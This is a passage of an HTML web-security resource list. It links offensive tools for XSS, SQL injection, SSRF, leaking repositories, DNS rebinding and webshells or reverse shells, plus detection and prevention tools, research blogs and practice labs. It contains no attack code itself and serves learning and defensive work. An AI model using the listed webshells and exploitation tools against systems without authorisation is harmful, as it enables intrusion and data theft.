data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3RoZUluZmVjdGVkRHJha2U=\">@_tID</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZsaXBrYXJ0LWluY3ViYXRvci9hc3RyYQ==\">Astra</span> - Automated Security Testing For REST API's by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZsaXBrYXJ0LWluY3ViYXRvcg==\">@flipkart-incubator</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RhZ3J6L2F3c19wd24=\">aws_pwn</span> - A collection of AWS penetration testing junk by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RhZ3J6\">@dagrz</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9idWNrZXRzLmdyYXloYXR3YXJmYXJlLmNvbS8=\">grayhatwarfare</span> - Public buckets by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ncmF5aGF0d2FyZmFyZS5jb20v\">grayhatwarfare</span>.</li>\n</ul>\n<p><a name=\"tools-offensive\"></a></p>\n<h3 id=\"offensive\"><a class=\"anchor\" href=\"#offensive\">#</a> Offensive</h3>\n<p><a name=\"tools-xss\"></a></p>\n<h4 id=\"xss-cross-site-scripting-2\"><a class=\"anchor\" href=\"#xss-cross-site-scripting-2\">#</a> XSS - Cross-Site Scripting</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JlZWZwcm9qZWN0L2JlZWY=\">beef</span> - The Browser Exploitation Framework Project by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iZWVmcHJvamVjdC5jb20=\">beefproject</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9KU2hlbGw=\">JShell</span> - Get a JavaScript shell with XSS by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdg==\">@s0md3v</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9YU1N0cmlrZQ==\">XSStrike</span> - XSStrike is a program which can fuzz and bruteforce parameters for XSS. It can also detect and bypass WAFs by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdg==\">@s0md3v</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2aWxjb3MveHNzb3Iy\">xssor2</span> - XSS'OR - Hack with JavaScript by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2aWxjb3M=\">@evilcos</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jc3Blci5pby9ldmFsdWF0b3I=\">csp evaluator</span> - A tool for evaluating content-security-policies by <span class=\"exturl\" data-url=\"aHR0cDovL2NzcGVyLmlv\">Csper</span>.</li>\n</ul>\n<p><a name=\"tools-sql-injection\"></a></p>\n<h4 id=\"sql-injection-3\"><a class=\"anchor\" href=\"#sql-injection-3\">#</a> SQL Injection</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw\">sqlmap</span> - Automatic SQL injection and database takeover tool.</li>\n</ul>\n<p><a name=\"tools-template-injection\"></a></p>\n<h4 id=\"template-injection\"><a class=\"anchor\" href=\"#template-injection\">#</a> Template Injection</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VwaW5uYS90cGxtYXA=\">tplmap</span> - Code and Server-Side Template Injection Detection and Exploitation Tool by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VwaW5uYQ==\">@epinna</span>.</li>\n</ul>\n<p><a name=\"tools-xxe\"></a></p>\n<h4 id=\"xxe-3\"><a class=\"anchor\" href=\"#xxe-3\">#</a> XXE</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dvU2VjdXJlL2R0ZC1maW5kZXI=\">dtd-finder</span> - List DTDs and generate XXE payloads using those local DTDs by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dvU2VjdXJl\">@GoSecure</span>.</li>\n</ul>\n<p><a name=\"tools-csrf\"></a></p>\n<h4 id=\"cross-site-request-forgery\"><a class=\"anchor\" href=\"#cross-site-request-forgery\">#</a> Cross Site Request Forgery</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzB4SW5mZWN0aW9uL1hTUkZQcm9iZQ==\">XSRFProbe</span> - The Prime CSRF Audit &amp; Exploitation Toolkit by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzB4aW5mZWN0aW9u\">@0xInfection</span>.</li>\n</ul>\n<p><a name=\"tools-ssrf\"></a></p>\n<h4 id=\"server-side-request-forgery\"><a class=\"anchor\" href=\"#server-side-request-forgery\">#</a> Server-Side Request Forgery</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pbnRpZ3JpdGkuaW8vcmVkaXJlY3Rvci8=\">Open redirect/SSRF payload generator</span> - Open redirect/SSRF payload generator by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaW50aWdyaXRpLmNvbS8=\">intigriti</span>.</li>\n</ul>\n<p><a name=\"tools-leaking\"></a></p>\n<h3 id=\"leaking\"><a class=\"anchor\" href=\"#leaking\">#</a> Leaking</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1My9IVFRQTGVha3M=\">HTTPLeaks</span> - All possible ways, a website can leak HTTP requests by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1Mw==\">@cure53</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tvc3QvZHZjcy1yaXBwZXI=\">dvcs-ripper</span> - Rip web accessible (distributed) version control systems: SVN/GIT/HG... by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tvc3Q=\">@kost</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2aWxwYWNrZXQvRFZDUy1QaWxsYWdl\">DVCS-Pillage</span> - Pillage web accessible GIT, HG and BZR repositories by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2aWxwYWNrZXQ=\">@evilpacket</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Vua0w0Yi9HaXRNaW5lcg==\">GitMiner</span> - Tool for advanced mining for content on Github by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Vua0w0Yg==\">@UnkL4b</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3pyaWNldGhlemF2L2dpdGxlYWtz\">gitleaks</span> - Searches full repo history for secrets and keys by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3pyaWNldGhlemF2\">@zricethezav</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21heGNoZWhhYi9DU1MtS2V5bG9nZ2luZw==\">CSS-Keylogging</span> - Chrome extension and Express server that exploits keylogging abilities of CSS by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21heGNoZWhhYg==\">@maxchehab</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FsbHlzaGthL3B3bmdpdG1hbmFnZXI=\">pwngitmanager</span> - Git manager for pentesters by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FsbHlzaGth\">@allyshka</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhbm5vYi9zbmFsbHlnYXN0ZXI=\">snallygaster</span> - Tool to scan for secret files on HTTP servers by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhbm5vYg==\">@hannob</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dlcmJlbkphdmFkby9MaW5rRmluZGVy\">LinkFinder</span> - Python script that finds endpoints in JavaScript files by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dlcmJlbkphdmFkbw==\">@GerbenJavado</span>.</li>\n</ul>\n<p><a name=\"tools-detecting\"></a></p>\n<h3 id=\"detecting\"><a class=\"anchor\" href=\"#detecting\">#</a> Detecting</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcWxjaG9wLmNoYWl0aW4uY24v\">sqlchop</span> - SQL injection detection engine by <span class=\"exturl\" data-url=\"aHR0cDovL2NoYWl0aW4uY29t\">chaitin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3NjaG9wLmNoYWl0aW4uY24v\">xsschop</span> - XSS detection engine by <span class=\"exturl\" data-url=\"aHR0cDovL2NoYWl0aW4uY29t\">chaitin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JldGlyZUpTL3JldGlyZS5qcw==\">retire.js</span> - Scanner detecting the use of JavaScript libraries with known vulnerabilities by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JldGlyZUpT\">@RetireJS</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0h5bmVrUGV0cmFrL21hbHdhcmUtamFpbA==\">malware-jail</span> - Sandbox for semi-automatic Javascript malware analysis, deobfuscation and payload extraction by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0h5bmVrUGV0cmFr\">@HynekPetrak</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2F1dGgwL3JlcG8tc3VwZXJ2aXNvcg==\">repo-supervisor</span> - Scan your code for security misconfiguration, search for passwords and secrets.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0xld2lzQXJkZXJuL2JYU1M=\">bXSS</span> - bXSS is a simple Blind XSS application adapted from <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdXJlNTMuZGUvbQ==\">cure53.de/m</span> by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0xld2lzQXJkZXJu\">@LewisArdern</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovLzBkYXkud2Vic2Fhcy5jb20uY24v\">重大漏洞在线检测系统</span> - 重大漏洞在线检测系统 by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5kYmFwcHNlY3VyaXR5LmNvbS5jbi8=\">杭州安恒信息技术有限公司</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FwcHMvZ3VhcmRyYWlscw==\">GuardRails</span> - A GitHub App that provides security feedback in Pull Requests.</li>\n</ul>\n<p><a name=\"tools-preventing\"></a></p>\n<h3 id=\"preventing\"><a class=\"anchor\" href=\"#preventing\">#</a> Preventing</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1My9ET01QdXJpZnk=\">DOMPurify</span> - DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdXJlNTMuZGUv\">Cure53</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xlaXpvbmdtaW4vanMteHNz\">js-xss</span> - Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xlaXpvbmdtaW4=\">@leizongmin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Nvc3NhY2tsYWJzL2FjcmE=\">Acra</span> - Client-side encryption engine for SQL databases, with strong selective encryption, SQL injections prevention and intrusion detection by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29zc2Fja2xhYnMuY29tLw==\">@cossacklabs</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jc3Blci5pbw==\">Csper</span> - A set of tools for building/evaluating/monitoring content-security-policy to prevent/detect cross site scripting by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jc3Blci5pbw==\">Csper</span>.</li>\n</ul>\n<p><a name=\"tools-proxy\"></a></p>\n<h3 id=\"proxy\"><a class=\"anchor\" href=\"#proxy\">#</a> Proxy</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2hhcmxlc3Byb3h5LmNvbS8=\">Charles</span> - HTTP proxy / HTTP monitor / Reverse Proxy that enables a developer to view all of the HTTP and SSL / HTTPS traffic between their machine and the Internet.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pdG1wcm94eS9taXRtcHJveHk=\">mitmproxy</span> - Interactive TLS-capable intercepting HTTP proxy for penetration testers and software developers by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pdG1wcm94eQ==\">@mitmproxy</span>.</li>\n</ul>\n<p><a name=\"tools-webshell\"></a></p>\n<h3 id=\"webshell\"><a class=\"anchor\" href=\"#webshell\">#</a> Webshell</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9uYW5v\">nano</span> - Family of code golfed PHP shells by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdg==\">@s0md3v</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rlbm5jL3dlYnNoZWxs\">webshell</span> - This is a webshell open source project by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rlbm5j\">@tennc</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VwaW5uYS93ZWV2ZWx5Mw==\">Weevely</span> - Weaponized web shell by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VwaW5uYQ==\">@epinna</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmcvV2Vic2hlbGwtU25pcGVy\">Webshell-Sniper</span> - Manage your website via terminal by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmc=\">@WangYihang</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmcvUmV2ZXJzZS1TaGVsbC1NYW5hZ2Vy\">Reverse-Shell-Manager</span> - Reverse Shell Manager via Terminal <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmc=\">@WangYihang</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzU5Njc0Lmh0bWw=\">Linux 后门整理合集（脉搏推荐）</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzL2F1dGhvci9hcm15emVyMA==\">armyzer0</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2x1a2VjaGlsZHMvcmV2ZXJzZS1zaGVsbA==\">reverse-shell</span> - Reverse Shell as a Service by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2x1a2VjaGlsZHM=\">@lukechilds</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25pbDB4NDIvcGhwc3Bsb2l0\">PhpSploit</span> - Full-featured C2 framework which silently persists on webserver via evil PHP oneliner by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25pbDB4NDI=\">@nil0x42</span>.</li>\n</ul>\n<p><a name=\"tools-disassembler\"></a></p>\n<h3 id=\"disassembler\"><a class=\"anchor\" href=\"#disassembler\">#</a> Disassembler</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BsYXNtYS1kaXNhc3NlbWJsZXIvcGxhc21h\">plasma</span> - Plasma is an interactive disassembler for x86/ARM/MIPS by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BsYXNtYS1kaXNhc3NlbWJsZXI=\">@plasma-disassembler</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JhZGFyZS9yYWRhcmUy\">radare2</span> - Unix-like reverse engineering framework and commandline tools by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JhZGFyZQ==\">@radare</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2h0ZXNvL2lhaXRv\">Iaitō</span> - Qt and C++ GUI for radare2 reverse engineering framework by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2h0ZXNv\">@hteso</span>.</li>\n</ul>\n<p><a name=\"tools-decompiler\"></a></p>\n<h3 id=\"decompiler\"><a class=\"anchor\" href=\"#decompiler\">#</a> Decompiler</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5iZW5mLm9yZy9vdGhlci9jZnIv\">CFR</span> - Another java decompiler by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9MZWVBdEJlbmY=\">@LeeAtBenf</span>.</li>\n</ul>\n<p><a name=\"tools-dns-rebinding\"></a></p>\n<h3 id=\"dns-rebinding-2\"><a class=\"anchor\" href=\"#dns-rebinding-2\">#</a> DNS Rebinding</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyYW5ub25kb3JzZXkvZG5zLXJlYmluZC10b29sa2l0\">DNS Rebind Toolkit</span> - DNS Rebind Toolkit is a frontend JavaScript framework for developing DNS Rebinding exploits against vulnerable hosts and services on a local area network (LAN) by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyYW5ub25kb3JzZXk=\">@brannondorsey</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL213cmxhYnMvZHJlZg==\">dref</span> - DNS Rebinding Exploitation Framework. Dref does the heavy-lifting for DNS rebinding by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL213cmxhYnM=\">@mwrlabs</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25jY2dyb3VwL3Npbmd1bGFyaXR5\">Singularity of Origin</span> - It includes the necessary components to rebind the IP address of the attack server DNS name to the target machine's IP address and to serve attack payloads to exploit vulnerable software on the target machine by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25jY2dyb3Vw\">@nccgroup</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyYW5ub25kb3JzZXkvd2hvbm93\">Whonow DNS Server</span> - A malicious DNS server for executing DNS Rebinding attacks on the fly by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyYW5ub25kb3JzZXk=\">@brannondorsey</span></li>\n</ul>\n<p><a name=\"tools-others\"></a></p>\n<h3 id=\"others-2\"><a class=\"anchor\" href=\"#others-2\">#</a> Others</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLnNrdWxsc2VjdXJpdHkub3JnL2luZGV4LnBocD90aXRsZT1EbnNsb2dnZXI=\">Dnslogger</span> - DNS Logger by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2lhZ294ODY=\">@iagox86</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2djaHEvQ3liZXJDaGVm\">CyberChef</span> - The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis - by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2djaHE=\">@GCHQ</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2IxN3pyL250bG1fY2hhbGxlbmdlcg==\">ntlm_challenger</span> - Parse NTLM over HTTP challenge messages by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2IxN3py\">@b17zr</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rhdmlzby9jZWZkZWJ1Zw==\">cefdebug</span> - Minimal code to connect to a CEF debugger by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rhdmlzbw==\">@taviso</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rhdmlzby9jdGZ0b29s\">ctftool</span> - Interactive CTF Exploration Tool by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rhdmlzbw==\">@taviso</span>.</li>\n</ul>\n<h2 id=\"social-engineering-database\"><a class=\"anchor\" href=\"#social-engineering-database\">#</a> Social Engineering Database</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYXZlaWJlZW5wd25lZC5jb20v\">haveibeenpwned</span> - Check if you have an account that has been compromised in a data breach by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJveWh1bnQuY29tLw==\">Troy Hunt</span>.</li>\n</ul>\n<h2 id=\"blogs\"><a class=\"anchor\" href=\"#blogs\">#</a> Blogs</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3Lw==\">Orange</span> - Taiwan's talented web penetrator.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20v\">leavesongs</span> - China's talented web penetrator.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2FsYmlub3dheC5za2VsZXRvbnNjcmliZS5uZXQv\">James Kettle</span> - Head of Research at <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQv\">PortSwigger Web Security</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYnJva2VuYnJvd3Nlci5jb20v\">Broken Browser</span> - Fun with Browser Vulnerabilities.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kYXRhcmlmdC5ibG9nc3BvdC50dy8=\">Scrutiny</span> - Internet Security through Web Browsers by Dhiraj Mishra.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9idWVyLmhhdXMv\">BRETT BUERHAUS</span> - Vulnerability disclosures and rambles on application security.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubjB0cjAwdC5jb20v\">n0tr00t</span> - ~# n0tr00t Security Team.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcG5zZWMuY29tLw==\">OpnSec</span> - Open Mind Security!</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sb3JleHhhci5jbi8=\">LoRexxar</span> - 带着对技术的敬畏之心成长，不安于一隅...</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnJpcHN0ZWNoLmNvbS90YWdzL3NlY3VyaXR5Lw==\">RIPS Technologies</span> - Write-ups for PHP vulnerabilities.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuMGRheWxhYnMuY29tLw==\">0Day Labs</span> - Awesome bug-bounty and challenges writeups.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vc2FuZGFtYWxpdGguY29tLw==\">Blog of Osanda</span> - Security Researching and Reverse Engineering.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9raW5neC5tZS8=\">What is Security?</span> - Focus on Penetration Testing / Frontend Security / JavaScript Magic / APT Offense &amp; Defense / Java Security.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sbXhzcGFjZS5jb20v\">l1nk3r's blog</span> - Web security.</li>\n</ul>\n<h2 id=\"twitter-users\"><a class=\"anchor\" href=\"#twitter-users\">#</a> Twitter Users</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9IYWNrd2l0aEdpdGh1Yg==\">@HackwithGitHub</span> - Initiative to showcase open source hacking tools for hackers and pentesters</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9maWxlZGVzY3JpcHRvcg==\">@filedescriptor</span> - Active penetrator often tweets and writes useful articles</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9jdXJlNTNiZXJsaW4=\">@cure53berlin</span> - <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdXJlNTMuZGUv\">Cure53</span> is a German cybersecurity firm.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9Yc3NQYXlsb2Fkcw==\">@XssPayloads</span> - The wonderland of JavaScript unexpected usages, and more.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9raW51Z2F3YW1hc2F0bw==\">@kinugawamasato</span> - Japanese web penetrator.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9oM3hzdHJlYW0v\">@h3xstream</span> - Security Researcher, interested in web security, crypto, pentest, static analysis but most of all, samy is my hero.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9nYXJldGhoZXllcw==\">@garethheyes</span> - English web penetrator.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9oYXNlZ2F3YXlvc3VrZQ==\">@hasegawayosuke</span> - Japanese javascript security researcher.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zaGhuams=\">@shhnjk</span> - Web and Browsers Security Researcher.</li>\n</ul>\n<h2 id=\"practices\"><a class=\"anchor\" href=\"#practices\">#</a> Practices</h2>\n<p><a name=\"practices-application\"></a></p>\n<h3 id=\"application\"><a class=\"anchor\" href=\"#application\">#</a> Application</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JraW1taW5pY2gvanVpY2Utc2hvcA==\">OWASP Juice Shop</span> - Probably the most modern and sophisticated insecure web application - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JraW1taW5pY2g=\">@bkimminich</span> and the <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9vd2FzcF9qdWljZXNob3A=\">@owasp_juiceshop</span> team.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyZVNreVRlY2hub2xvZ3kvQmFkTGlicmFyeQ==\">BadLibrary</span> - Vulnerable web application for training - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyZVNreVRlY2hub2xvZ3k=\">@SecureSkyTechnology</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2hhY2t4b3IubmV0Lw==\">Hackxor</span> - Realistic web application hacking game - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9hbGJpbm93YXg=\">@albinowax</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3NlbGludXhnYW1lLm9yZy8=\">SELinux Game</span> - Learn SELinux by doing. Solve Puzzles, show skillz - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zZWxpbnV4Z2FtZQ==\">@selinuxgame</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5\">Portswigger Web Security Academy</span> - Free trainings and labs - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQv\">PortSwigger</span>.</li>\n</ul>\n<p><a name=\"practices-aws\"></a></p>\n<h3 id=\"aws-2\"><a class=\"anchor\" href=\"#aws-2\">#</a> AWS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2ZsYXdzLmNsb3VkLw==\">FLAWS</span> - Amazon AWS CTF challenge - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS8weGRhYmJhZDAw\">@0xdabbad00</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JoaW5vU2VjdXJpdHlMYWJzL2Nsb3VkZ29hdA==\">CloudGoat</span> - Rhino Security Labs' &quot;Vulnerable by Design&quot; AWS infrastructure setup tool  - Written by <span class=\"exturl\" 